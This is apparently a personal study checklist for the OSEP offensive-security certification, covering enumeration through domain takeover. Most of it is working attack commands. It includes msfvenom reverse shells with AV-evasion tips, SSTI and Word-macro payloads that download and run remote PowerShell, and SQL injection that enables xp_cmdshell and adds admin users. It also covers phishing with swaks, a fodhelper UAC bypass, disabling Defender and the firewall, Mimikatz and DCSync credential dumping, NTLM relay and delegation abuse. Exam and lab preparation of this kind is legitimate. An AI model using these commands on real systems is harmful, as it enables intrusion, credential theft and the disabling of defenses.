# Checklist for OSEP

## Enumeration

- Switch on your apache server
- Identify External vs Internal vs Vault IPs
- Full nmap scan (TCP + UDP) against External Hosts
- Note hostnames and update /etc/hosts
- Re-scan against hostnames
- Hostnames usually mean something. Put a remark in the table. For e.g, note things like clients, devs, DB etc
- Web Services should be fully enumerated with feroxbuster/gobuster.
	- Check Source Code for possible reveal of tech stack (ie .NET Razer)
	- Login pages for default creds
	- Wordpress sites to be wpscan
	- file upload pages to be tested
	- If there are two or more webservices on the same host (especially if one is like 80 or 8080) and there is a fileupload vector, one should test for path traversal when uploading files. It might be that it is possible to gain file execution only via the port 80 service. 
		- see if you can influence the upload path either by DIRECTLY CHANGING the NAME of the file (..\..\..\..\..\inetpub\wwwroot\evil.aspx) or burpsuite-ing it
	- If you are able to get a .db file from the web service, see if it changes when things are uploaded to the webserver
- DevOps stuff like gitlab, Ansible, Artifactory should be noted down as they will likely play a part further on
- If there are fields for user input, please try SQL Injection, SSTI payloads (Esp if it is powered by ASP.NET Razor). SQLMap can be very useful. For SSTI payloads, run the following:
```bash
# basically if the math resolves, it is vulnerable to code execution
{{4*4}}
@(3+2)
<%= 3 * 2 %>
```

## Meterpreter Payload Creation

- Use Get-Shellcode (https://github.com/gh0x0st/Get-Shellcode) to obfuscate ps1 meterpreter shellcode
- Slot that nice obfuscated shellcode into your ps1 shellcode runner. Remember to update the variables accordingly in the rest of the code. This has a 100% success rate on all OSEP Challenge Labs (CowMotors and DenkiAir included)
- if you are creating an .exe payload from csharp, use Sleep, non-emulated APIs (such as VirtualAllocExNuma) for sandbox evasion, use multiple byte XOR to encrypt your payload
- same idea for VBA
- for .hta code, it is jscript; XOR the shellcode, do dotnet2js, prepend an obfuscated jscript into the output .hta file from dotnet2js
- for prependmigrate, you need to set it up as a msfvenom option when creating a payload. Note that explorer may not always work if the target user is not an interactive user (such as svc accounts, IIS blah blah)
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> lport=443 prpendmigrateprocess=explorer.exe prependmigrate=true -f exe > evil.exe
```

### Catching Meterpreter Shells

- x86 for MSWord vectors, x64 for everything else
- Consider setting AutoRunScript in the advanced options of exploit/multi/handler to run a process migration upon establishing the meterpreter shell to evade AV
- if it doesnt work, you may wish to use prepend migrate which is another form of migration but done earlier in the process of establishing the shell (might be more unstable but allegedly more evasive)
```bash
# prepend migrate
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=443 EXITFUNC=Thread prpendmigrateprocess=explorer.exe prependmigrate=true -f ps1
# in Meterpreter
msf6 (exploit/multi/handler) > set AutoRunScript post/windows/manage/migrate
#OR
msf6 (exploit/multi/handler) > set prependmigrate true; set prependmigrateprocess explorer.exe
```

## Initial Access

### Web SSTI Vulnerability
- if SSTI vulnerable, read this for more info (https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/) (https://www.schtech.co.uk/razor-pages-ssti-rce/)
- test for command execution with
```csharp
@{ 
  var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c whoami");
  psi.RedirectStandardOutput = true;
  psi.UseShellExecute = false;
  var proc = System.Diagnostics.Process.Start(psi);
  var output = proc.StandardOutput.ReadToEnd();
}
@output
# ping check
@(System.Diagnostics.Process.Start("ping.exe", "<kali ip>"))

```
if the above works then powershell shellcode runner
```csharp
@{ System.Diagnostics.Process.Start("cmd.exe", "/c powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.XX.XX/simplerunner64.txt')"); }
# you may need to base64 it!
```

### SQL Vulnerability

- try out with simple payloads first like:
```
' OR 1=1 -- //
```
- avoid using sites that redirect upon successful auth bypass, cause that will make any automated tools like SQLMap run slower and more unstable
for sites that are vulnerable, capture the vulnerable parameter using Burpsuite, create a requests file to pass to sqlmap
```bash
# Manual sqlmapping
sqlmap -u "http://<victim ip>/login.asp?user=a&password=a"
# test for command execution
sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-cmd=whoami --thread=10
# if above okay, attempt to add new admin user
sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-cmd="net user hacker P@ssw0rd123! /add" 
sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-cmd="net localgroup administrators hacker /add"
# try to get shell
sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --os-shell
# if above does not work, try sql shell and then enable xp_cmdshell. Can also consider uploading a malicious asp file to web root and execute
sqlmap -u "http://<victim ip>/login.asp?user=a&password=a" --sql-shell

## manual SQL Injection in BurpSuite; note you may need to use + or %20 for the whitespaces
http://192.168.X.X/login.asp?user=test&pass=1' or 1=1;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
```
- Note if there is SQL vuln, that means there is an SQL database somewhere (most likely MSSQL)

### Email Phishing Vector
- Look out for hosts with smtp (Port 25 default) and see if there are any email addresses found
- Use smtp-user-enum if unable to find email addresses
- send email with swaks
```bash
# Send as Attachment
sudo swaks -t target@domain.com --from hacker@hacker.com --server <host with port25> --body 'CV Attached' --header Anything --attach @<name of attachedfile>

# Send malicious link
sudo swaks -t target@domain.com --from hacker@hacker.com --server <host with port25> --body 'Click here http://<attacker ip>>/clickme.hta' --header Anything

```

### MSDoc Phishing
- Assuming you know that you need to set up the DocumentOpen and AutoOpen functions
- if .doc related, start off with a simple ping payload to check connectivity and command execution
```vba
Sub MyMacro()
	Dim str As String
	str = "ping.exe <kali ip>"
	Shell str, vbHide
End Sub
```
- if the above fires, use a powershell download cradle to fire off a meterpreter shell. Note that for MSWord, you need a x86 payload!
```vba
Sub MyMacro()
	Dim str As String
	str = "powershell.exe -nop -ep bypass -c IEX(New-Object System.Net.WebClient).Downloadstring('http://<kali ip>/amsi.txt')"
	str = "powershell.exe -nop -ep bypass -c IEX(New-Object System.Net.WebClient).Downloadstring('http://<kali ip>/simplerunner.txt')"
	Shell str, vbHide
End Sub
```
- if (New-Object System.Net.WebClient) does not work you can use the following. Though if New-Object doesnt work, it is likely that IEX is disabled as well
```vba
Sub MyMacro()
	Set shel_obj = CreateObject("Wscript.Shell")
	shell_obj.Run "powershell.exe -ep bypass -c iwr http://kali/simplerunner.txt | IEX", 0
End Sub
```
- if the above fails, likely powershell is restricted in some way or your meterpreter shell is caught (check for hits to your apache server)
- Another way via WMI (do one by one, AMSI first and then the powershell)
```vba
Sub MyMacro()
    strArg = "powershell -enc SQBFAFgAKA... "
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
```
- Can consider a direct VBA Shellcode Runner (obfuscated shellcode) of course
- if not, you can use get the VBA to download your compiled executable and execute it with InstalUtil

### ELF File Upload

- Linux boxes are usually simpler. Try the following payload
- Prependfork=true spawns a child process before executing the malcode which is stealthier and is more stable as the parent process wont crash or have malcode running in it
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf
```

-----------------------------------------------------------------------------------------------
## PrivEsc(Windows)

- First off, do local and then domain enumeration as much as you can.
- Domain enumeration is best executed via SharpHound.exe within the windows host but if not possible or you cant gain access to a Windows host that is from another domain, you can run bloodhound-ce-python
- When using kerberos authentication, you need to update your /etc/hosts. The best way to do this properly is this
```bash
nxc smb 172.16.XX.XX/24 -u '' -p '' --generate-hosts-file hostfile
# copy and paste the output in hostfile in /etc/hosts
```
```bash
# via kerberos
bloodhound-ce-python -c all -d target.com -ns 172.16.221.101 -u lisa.penn@target.com -k -no-pass
```
- If applocker is in effect, you can use the Interactive Runspace () and run Invoke-Bloodhound and Winpeas.ps1 via InstalUtil
- You can also try the metasploit module post/windows/manage/execute_assembly

### SeImpersonatePrivilege

- If you have meterpreter, just use GetSystem
- If not, try SigmaPotato.exe. This doesnt get caught in OSEP Labs (though it will definitely get caught in modern systems)
- If not, you can use an obfuscated PrintSpoofer

### AlwaysInstallElevated

- multiple ways to do this. Need to see which works
**Via Meterpreter**
```bash
# remember to set a x64 payload or else this wont work
use exploit/windows/local/always_install_elevated
```
**Via Msfvenom**
- I cannot get this to work ever (edit:The suspicion is that AV catches this)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali ip> lport=443 -a x64 -f msi -o evil.msi

# onvictim
msiexec /quiet /qn /i evil.msi
```

**Via MSI Wrapper**
- You need to have your own Windows machine. Download MSI Wrapper from (https://www.exemsi.com/download/)
- Create an obfuscated exe payload that can bypass AV. Suggest a XOR Csharp payload or a Process Hollowing payload (this works. Tested and tried)
- Wrap that payload using MSI Wrapper. See here for steps >>

### Special Domain Groups

#### LAPS Readers/ PswReaders
- This means that the user can read the Local Admin's password
- you can use lapstoolkit from here (https://github.com/leoloobeek/LAPSToolkit) or from nxc 
```powershell
Import-Module ./Get-LAPSComputers
Get-LAPSComputers
```
```bash
nxc ldap <DC of domain> -u <User> -H 'hash' --module laps
```

#### IT/DEV/HR/(somethingADMINS like DEVAdmins/CLAdmins/LinuxAdmins)
- target those hosts with those hostnames with the creds found


#### Bypassing UAC
- You see that your user is part of the local Administrators group but yet when you whoami /priv, you dont see perms like SeImpersonatePrivilege. Why?
- That is because you are operating in Medium or lower context due to UAC being active
- UAC bypass via Fodhelper by creating yet another shell as the same guy but a higher level
```bash
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.45.168/simplerunner64.txt') | IEX" -Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

C:\Windows\System32\fodhelper.exe
```

## PrivEsc (Linux)

### The Usual
- check for sudo -l, history, SUID bits, cron jobs, overly permissive bash files etc
- check users via /etc/passwd and /home and see if you can see any passwords you have found earlier
- sometimes passwords are just the usernames
- check for config files on web services (apache2 config.php)
- run linpeas or lse or pspy

### Ansible Stuff
- Check if there is ansible on the host iether by running ansible or checking if /opt/ansible exists
- even if there isn't, you want to see if there are 
- if you run into an Ansible Vault file or things iwth Ansible Vault text, try cracking. Password from the vault is probably for root or something
```bash
# copy the text starting from $ANSIBLE_VAULT, strip all whitespaces and new lines
ansible2john vault.txt > ansible.txt
# remove prepended stuff by john
hashcat -m 16900 ansible.txt rockyou.txt
# transfer vault.txt back to the victim and decrypt. Provide the cracked password
cat vault.txt | ansible-vault decrypt
```
### Kerberos Cache files
- check /tmp folder and see if there are any kerberos cache and see who owns those
- the /tmp folder differs for each user! so if you can switch, be sure to check!
```bash
ls -la /tmp 
# search filesystem
find / -name krb5cc_* 2>/dev/null
# copy the file first because the name of cache file can change dynamically
cp /tmp/krb5cc_iabasbobasd /tmp/krb5cc_owned
# copy this out to your kali to be imported to your env
export KRB5CCNAME=<path to your krb5cc_owned>

```

### ControlMaster SSH Session Hijacking
- if you see ControlMaster inside someone's .ssh folder, this might be the path forward
- first check the config file and make the necessary edits. (if it doesnt exist, create it and chmod 644)
```bash
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p # this dictates the path where new SSH connections will be placed in
        ControlMaster auto
        ControlPersist yes # for persistent connections that never drop
```
- now we either wait for the target to SSH into our host.
```bash
ssh -S ./user\@target\:22 user@target
```

## Post-Exploitation (Windows)
- Remember to tag the owned host on Bloodhound!

### Disable Defenses
- Once you get someone with admin permissions, disable Defender, UAC, and firewall. You may also wish to open up WinRM and RDP ports for convenience
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
```
```cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"

winrm quickconfig
```

### Check config files
- if there is inetpub, it is worth investigating the Web.Config file to see any connection references to things like MSSQL or DB. Usually that will be a hint towards the next step

### Mimikatz
```cmd
privilege::debug
# dump out all NTLM (and maybe cleartext if they are currently logged in) of all accounts that has logged in before
sekurlsa::logonpasswords
# dump out all NTLM in the SAM and potentially clear text passwords
token::elevate
lsadump::sam
lsadump::secrets
# if user is DA or has backup powers
lsadump::dcsync /domain:<domain> /all /csv
```
Alternative
```bash
nxc smb <target ip> -u Administrator -p <password> --sam --lsa -M lsassy
# to dump everything out from DC
nxc smb <DC ip> -u Administrator -p <password> -M ntdsutil
```

## Post Exploitation (Linux)

- if there are domain users inside the /home folder, check their folders for .ssh keys and cache files or any other non-default stuff
- check the known_hosts files in the .ssh folder to check if there are info on ssh histories
- Generate SSH keys for these users so that you can login as them since you are root
```bash
# on kali
ssh-keygen -t rsa
# copy the id_rsa.pub file to the victim's .ssh folder and rename it authorized_keys
chmod 700 .ssh
chmod 600 authorized_keys
chown victim:victim authorized_keys
# you can now ssh in with the id_rsa key without password
```

## Lateral Movement

### Psexec with Admin
```bash
psexec.py <domain>/<user>@<FQDN host> -k -no-pass
```

### Via MSSQL
- Note any hosts named DB or SQL
- if not one can always enumerate via nxc mssql or use tools like MSSQLand or native enumeration

**Via MSSQLClient.py**
- You may need to try multiple accounts such as the local administrator, the supposed SQL domain account and the machine account 
```bash
# with hashes
mssqlclient.py Administrator@<DB ip> -hashes ':<NT Hash>' -windows-auth
# with password using domain account
mssqlclient.py MCU.lab/Ppots@visionSQL -windows-auth
```
- Generic MSSQL Enumeration (though you can just use mssqlclient in built functions)
```bash
# check for linked servers
EXEC sp_linkedservers
# OR
select srvname from master..sysservers

# check if link from your current DB to the target has SA perms; 1 if sa 0 if not
select * from openquery("WANDASQL", 'SELECT is_srvrolemember(''sysadmin'')')
# check if can execute stored_procedures (such as xp_cmdshell or xp_dirtree) over the link
select is_rpc_out_enabled FROM sys.servers WHERE name ='WANDASQL'

# if link is not sa but RPC OUT is enabled, we can still run things like xp_dirtree for NTLMv2 relay
# start responder and then in the MSSQL, force an authentication over SMB to capture the NTLMv2 hash
select * from openquery("WANDASQL", 'SELECT 1; EXEC master..xp_dirtree ''\\<attacker ip>\test''')
```
- Using mssqlclient
```bash
# first try your luck
enable_xp_cmdshell
# obviously it will fail. It cant be that easy!
# check out linked servers; What you want to see is something under the Linked Server Local Login Self Mapping Remote login table; if there is nothing, means your current account is not powerful enough (or there is literally nothing)
enum_links
# if nothing, check who is login or the users you can impersonate or exec as
enum_logins
enum_users
# if you see something like sa or DB02/Administrator or just a diff user from your current user, try impersonating them via the relevant command depending on where you see them
exec_as_login sa 
exec_as_user sa 
# if successful you should see your user become the new user. do the above all over again
# if you can jump DBs
use_link DB03
# then do the following until you hit somewhere where you can xp_cmdshell for profit
```

#### NTLMRelay 
- if NTLMv2 hash from responder not crackable, and you cant execute xp_cmdshell on the remote DB BUT you can run xp_dirtree, try an NTLM Relay attack
```bash
# if you have smbd active, disable it first
sudo ss --tcp --udp --listen --numeric --process | grep 445
kill <pid>

# Set up ntlmrelayx; check for command execution
sudo ntlmrelayx.py --no-http-server -smb2support -t <target ip> -c 'whoami'
# on the mssqlclient, run xp_dirtree
xp_dirtree \\<attacker ip>\any\file.txt
# once command execution is confirm, do a powershell shellcode runner. Base64 it to avoid problems
# on kali
$a = "(New-Object System.Net.WebClient).DownloadString('http://<attackerip>/shellcoderunner.ps1') | IEX"
$b = [System.Text.Encoding]::Unicode.GetBytes($a)
$e = [Convert]::ToBase64String($b)
```

### Kerberoasting
- once you have a domain user, do this and see if there are easy wins
- also you can try request cross-domain SPNs if you believe your domain account can do so!
- if not crackable, it might be possible to do a silver ticket attack
```bash
# via kerberos ticket
GetUserSPNs.py -request -target-domain test.com -dc-ip 172.16.221.101 -outputfile kerber.hash test.com/lisa.penn -k -no-pass

hashcat -m 13100 kerber.hash rockyou.txt
```

### Via Password Spray/Reuse
- When compromising any windows host, try spraying the local administrator as well as new domain users you obtained
- maybe that DEV01 admin hash can work for DEV02 or that mssql admin hash for SQL11 works for SQL13?
```bash
nxc smb/mssql/winrm/rdp 172.16.XX.XX -u administrator -H 'hash' --local-auth
nxc ssh 172.16.XX.XX -u tom.jerry@test.local -p 'password'
# remember to reload your tickets!
klist
nxc smb 172.16.XX.XX -u tom.jerry -k --use-kcache
```

### ACL Based Attacks

#### WriteDACL
```bash
# sqlsvc is the controlled user with WriteDACL rights, -target-dn is the target group you want to write stuff to
sudo /home/kali/.local/bin/dacledit.py -action 'write' -rights 'WriteMembers' -principal 'sqlsvc' -target-dn 'CN=MAILADMINS,OU=TGROUPS,DC=LOCAL,DC=COM' 'local.com'/'sqlsvc':'password' -dc-ip <dc-ip>

# this adds sqlsvc to become a member of mailadmins
net rpc group addmem "mailadmins" "sqlsvc" -U "tricky.com"/"sqlsvc"%"password" -S <dc-ip>

```

#### GenericWrite/Resource-Based Constrained Delegation
```bash
# computer name can be anything; need to provide a legitimate domain user that has admin powers on the HOST that can GenericWrite to another host
addcomputer.py -computer-name 'attacker01' -computer-pass 'Password123!' -dc-host local.com -dc-ip 172.16.195.165 local.com/jim -hashes ':NT hash'
# we then set up the delegation from attacker01 to the victim host
rbcd.py -delegate-from 'attacker01$' -delegate-to 'victim09$' -action 'write' local.com/victim09$ -dc-ip 172.16.195.165 -hashes ':hash'
# get the ST for the service name that we are pretending to be admin for
getST.py -spn 'cifs/victim09.local.com' -impersonate 'administrator' 'local.com/attacker01:Password123!' -dc-ip 172.16.195.165
# export ticket
export KRB5CCNAME=<ticket>
psexec.py administrator@victim09.local.com -k -no-pass
```

#### ForceChangePassword
```bash
net rpc password "TargetUser" "newpassword" -U "local.com"/"ControlledUser"%"Password" -S "DC FQDN"
```

#### DelegateTo
```bash
## do try http, mssql for altservice if it doesnt work! For the SPN, check the spn value of the victim in the bloodhound
# if the below doesnt work, try removing the domain from the spn
getST.py -spn 'MSSQLSVC/target.test-ops.com' -impersonate 'administrator' -altservice 'cifs' -hashes ':<hash of controlled machine account>' 'TEST-OPS.COM/CONTROLLEDMACHINE$' -dc-ip 172.16.211.100
# from windows
Rubeus.exe s4u /user:APP01$ /rc4:<NTLM hash of APP01$> /impersonateuser:administrator /msdsspn:"CIFS/target" /altservice:cifs /ptt
```

#### child/Parent Domain Trust
- if the child is TrustedBy the parent domain, we can use a raiseby to elevate ourselves from domain admin to enterprise admin
```bash
raiseChild.py ops.local.com/testAdmin -hashes ':NT hash'
```

## Cross-Domain Movement
- check for foreign members. From bloodhound, click on the domain object and check the members and see what rights they have on the other domain